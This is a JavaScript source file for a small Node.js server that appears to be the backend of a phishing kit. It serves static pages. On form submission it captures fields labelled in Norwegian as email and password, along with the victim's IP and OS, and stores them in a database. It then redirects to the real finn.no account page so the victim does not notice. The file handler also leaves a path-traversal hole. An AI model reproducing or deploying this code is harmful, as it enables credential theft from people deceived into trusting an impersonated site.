import http from "http";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import querystring from "querystring"
import { insertCred } from "./database.js"

const port = 8080;

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const server = http.createServer(async (req, res) => {
    if (req.method == "GET") {
        let filePath = path.join(
            __dirname,
            "public",
            req.url === "/" ? "index.html" : req.url
        );

        let extName = path.extname(filePath);
        let contentType = "text/html";

        switch (extName) {
            case ".css":
                contentType = "text/css";
                break;
            case ".js":
                contentType = "text/javascript";
                break;
            case ".png":
                contentType = "image/png";
                break;
            case ".woff":
                contentType = "font/woff";
                break;
            case ".woff2":
                contentType = "font/woff2";
                break;
            case ".ttf":
                contentType = "font/ttf";
                break;
        }

        console.log(`File path: ${filePath}`);
        console.log(`Content type: ${contentType}`);

        res.writeHead(200, { "Content-Type": contentType });

        const readStream = fs.createReadStream(filePath);
        readStream.pipe(res);

        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            console.log(data.ip)
        } catch (error) {
            console.log('Error fetching IP address:', error);
        }
    } else if (req.method == "POST") {
        let body = ""
        req.on("data", chunk => {
            body += chunk.toString()
        })

        req.on("end", async () => {
            const formData = querystring.parse(body)
            const { epost, passord, ip, os } = formData

            try {
                const newCred = await insertCred(epost, passord, ip, os)
                res.writeHead(302, { location: "https://www.finn.no/my-page" })
                res.end(JSON.stringify({ succes: true, newCred }))
            } catch (err) {
                res.writeHead(500, { "content-type": "application/json" })
                res.end(JSON.stringify({ succes: false, error: err.message }))
            }
        })
    } else {
        res.writeHead(404, { "content-type": "text/plain" })
        res.end("Route not found")
    }
});

server.listen(port, (err) => {
    if (err) {
        console.log(`oopsie: ${err}`);
    } else {
        console.log(`Listening on port ${port}!`);
    }
});